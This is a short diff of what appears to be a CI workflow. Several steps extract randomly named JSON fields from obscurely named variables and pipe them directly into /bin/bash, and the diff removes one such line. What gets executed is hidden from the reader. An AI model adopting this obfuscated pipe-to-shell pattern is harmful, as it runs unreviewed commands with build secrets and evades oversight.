@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$xetrt70680" | jq -r .kzd460 | /bin/bash
           printf '%s' "$nhlt53" | jq -r .dnohx7598 | /bin/bash
           printf '%s' "$q59" | jq -r .yfexp791 | /bin/bash
-          printf '%s' "$mkaam46" | jq -r .z18 | /bin/bash
           printf '%s' "$s74233" | jq -r .gg69312 | /bin/bash
 
       - name: Persist results
